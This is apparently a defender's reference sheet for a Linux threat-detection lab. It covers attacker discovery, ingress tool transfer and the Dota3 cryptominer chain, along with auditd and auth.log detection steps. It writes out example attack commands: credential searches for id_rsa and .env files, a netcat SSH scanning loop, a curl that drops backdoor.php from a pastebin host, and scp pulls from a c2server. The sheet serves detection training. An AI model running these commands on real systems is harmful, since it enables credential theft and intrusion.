# ⛏️ Linux Threat Detection 2(Discovery) — Reference Sheet

> **TL;DR:** This room covers what attackers do *after* breaching a Linux host — **Discovery** (where am I, what is this box), then **"Hack and Forget"** monetisation (cryptominer, botnet, proxy) delivered via **Ingress Tool Transfer** (`wget`/`curl`/`scp`). The catch: attackers use the *same* commands admins do, so detection is about **context** — build a process tree in auditd (`ausearch -i -x <cmd>`, then `--pid`/`--ppid`) to find which app or user spawned the command. `whoami` is the single highest-value canary. The room ends by tracing the real **Dota3** cryptominer chain end to end.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| `whoami` is the canary | Legit apps rarely run it; adversaries almost always run it first after a breach. A detection rule for **any** `whoami` execution is worth it. |
| Attackers use *your* commands | Discovery is `ps`, `id`, `ip a`, `cat /etc/passwd` — normal admin tooling. The **command alone proves nothing**; the parent process (context) separates bad from good. |
| Discovery can be skipped | If the attacker already knows the target, or just drops a cryptominer and leaves, you may see **no Discovery at all**. |
| Process logs miss remote pulls | If the attacker runs `scp` from **their** box to push a file onto the victim, the victim's auditd shows nothing — only a **new SSH login** in `auth.log`. |
| scp direction flips the log source | Attacker→victim push = look in **`auth.log`** (SSH login). Victim→attacker pull = look in **auditd** (`scp` command). Same for FTP/SMB. |
| Weird `/tmp` names are camouflage | `.X26-unix`, `.rsync`, `.apt` mimic legit software to discourage investigation. **Hidden dirs in `/tmp`** are a staging red flag. |
| `nohup` = "survive logout" | Miners/scanners are launched with `nohup` so they keep running after the SSH session closes. `nohup` in process logs is itself suspicious. |
| Early CPU/RAM queries = miner | `cat /proc/cpuinfo`, `free -m`, `lscpu` near the start ≈ cryptominer — little else needs that info. |
| `mdrfckr` is a signature | Dota3's `authorized_keys` comment is a unique, greppable IOC. String-matching known artifacts is a cheap win. |
| Miners self-secure the box | Dota3 changes the breached user's password and replaces SSH keys — locking out both the owner **and** rival botnets. A sudden password/key change is an IOC. |
| Read offline logs with `-if` | `ausearch -i -if /path/to/audit.log` reads an exported log file, not the live system — needed for scenario/forensic logs. |
| `-x` matches the binary | `ausearch -i -x whoami` filters by executable name (not `proctitle`); ideal for hunting one command, then pivoting with `--pid`/`--ppid`. |

## 1️⃣ Discovery Overview (Task 2)

Botnets automate Initial Access; the human (or script) joins once an entry point is ready and immediately asks "where am I?" The first Discovery commands are largely the same regardless of entry point or end goal.

| Discovery goal | Typical commands |
|---|---|
| OS & filesystem | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname` |
| Users & groups | `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd` |
| Process & network | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp` |
| Cloud / sandbox | `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"` |

### Detect your environment

**Purpose:** Identify whether the host is a cloud VM or sandbox (attackers do this to tailor or abort).

```bash
systemd-detect-virt
# Prints the virtualization/cloud platform, e.g. "amazon", "kvm", "none"

ps aux | grep -Ei 'edr|av|scan|sentinel|falcon'
# Hunt for EDR/AV processes; note the full binary path, e.g. /var/lib/ultrasec/malscan
```

## 2️⃣ Specialized Discovery + Detection (Task 3)

After basic Discovery, attackers run focused commands that reveal intent:

| Objective | Typical commands |
|---|---|
| Steal credentials / secrets | `history | grep pass`, `find / -name .env`, `find /home -name id_rsa` |
| Assess crypto-mining fit | `cat /proc/cpuinfo`, `lscpu | grep Model`, `free -m`, `top`, `htop` |
| Scan internal network | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done` |

### Context is everything

Detecting the commands is easy with auditd; deciding *who ran them and why* is the hard part.

| Looks like | Verdict |
|---|---|
| Web server suddenly spawns `whoami` | 🚩 Red flag — services don't enumerate themselves |
| IT member running `find`/`grep` for secrets | 🚩 Suspicious — needs justification |
| Network monitor periodically pinging the LAN | ✅ Often expected behaviour |

### Build the process tree

**Purpose:** Trace a Discovery command back to the script/app that launched it.

```bash
ausearch -i -x whoami
# Find a Discovery command by binary name -> note its ppid/pid

ausearch -i --pid 3898
# Inspect the parent; here proctitle=/usr/bin/bash /tmp/lp.sh -> a script!

ausearch -i --ppid 3898
# List everything that script spawned (e.g. find /home -name *secret*)
# -> confirms the script is malicious
```

## 3️⃣ Motivation: "Hack and Forget" (Task 4)

These attacks run at scale for quick gains (e.g. botnets scanning for an SSH `tryguessme` password). After a quick Discovery, the payoff is one — or all — of:

| Outcome | Goal |
|---|---|
| **Install cryptominer** | Use the victim's CPU/GPU to mine cryptocurrency |
| **Enroll to botnet** | Add to a botnet (e.g. **Mirai**) for tasks like DDoS |
| **Use as proxy** | Send phishing, host malware, or route attacker traffic |

## 4️⃣ Ingress Tool Transfer (Task 4)

**MITRE T1105.** Almost always done with one of three preinstalled commands:

| Command | Usage | Example |
|---|---|---|
| **wget** | Download a file from a website | `wget https://github.com/xmrig/.../xmrig-x64.tar.gz -O /tmp/miner.tar.gz` |
| **curl** | Request a webpage / save output | `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"` |
| **ssh (scp/sftp)** | Transfer a file over SSH | `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh` |

### The scp blind spot — which log to check

| Transfer direction | What you see | Detect via |
|---|---|---|
| **Option 1** — attacker pushes to victim: `scp ./malware.sh ubuntu@thm-vm:/tmp` | A **new SSH login** on the victim (no command logged) | `/var/log/auth.log` |
| **Option 2** — victim pulls from attacker: `scp attacker@attack-vm:./malware.sh /tmp` | The **`scp` command** runs locally | auditd (`ausearch -i -x scp`) |

### Extra detection sources for Ingress Tool Transfer

| Source | Indicators |
|---|---|
| Network traffic | Download from an IP/domain seen in attacks (VirusTotal), suspicious domains (`qfpkvwgq.thm`), or tool-hosting services (GitHub) |
| File events | New file in `/tmp` or `/var/tmp`; suspicious names like `exploit`, `shell.php`, `kF1pBsY5` |
| Antivirus | EDR/AV alert on a new malicious file or process |

## 5️⃣ Dota3 Cryptominer — Real-World Chain (Tasks 5 & 6)

A simple, widespread cryptominer (per CounterCraft & SANS reports). The full chain:

```
1. Initial Access  Botnet (>2000 IPs / 94 countries) brute-forces root over SSH (top-1000 passwords)
2. Discovery       cat /proc/cpuinfo · free -m · lscpu  -> cryptominer intent; then crontab -l, w, uname -m
3. Persistence     change breached user's password; rm -rf .ssh; plant malicious key ("mdrfckr"); chmod -R go= ~/.ssh
4. Ingress         scp <archive>.tar.gz -> /tmp ; unpack into hidden /tmp/.X26-unix/.rsync/c
5. Impact          nohup tsm (SSH-scan 192.168.* / 172.16.*) ; nohup initall (XMRig miner)
```

### Key behaviours

| Stage | Detail |
|---|---|
| Discovery → intent | The first 3 commands query CPU/RAM (`cpuinfo`, `free -m`, `lscpu`) — strong cryptominer signal. |
| Persistence | Resets the user password and overwrites `~/.ssh/authorized_keys` with the attacker's key (the `mdrfckr` comment is the IOC). |
| Staging | Tools unpacked into a hidden, legit-looking `/tmp` dir (`.X26-unix`, `.rsync`, `.apt`). |
| Binaries | **`tsm`** = internal SSH network scanner; **`initall`** = XMRig miner. Both run under **`nohup`** to survive logout. |

### Detecting Dota3

| Source | Indicator |
|---|---|
| Auth logs | `cat /var/log/auth.log | grep "Accepted"` — password logins from untrusted external IPs |
| Auditd | `ausearch -i -x [command]` — Discovery commands (`uname`, `lscpu`), hidden `/tmp` files, malware-named archives, `nohup` usage |
| String match | Alert on the `mdrfckr` attack string |
| Network | SSH port scan across whole `192.168.*` / `172.16.*` |
| EDR | XMRig binary blocked by most EDRs |

**Reading the scenario's offline logs:**

```bash
ausearch -i -if /home/ubuntu/scenario/audit.log
# -if reads the exported audit log file instead of the live system
```
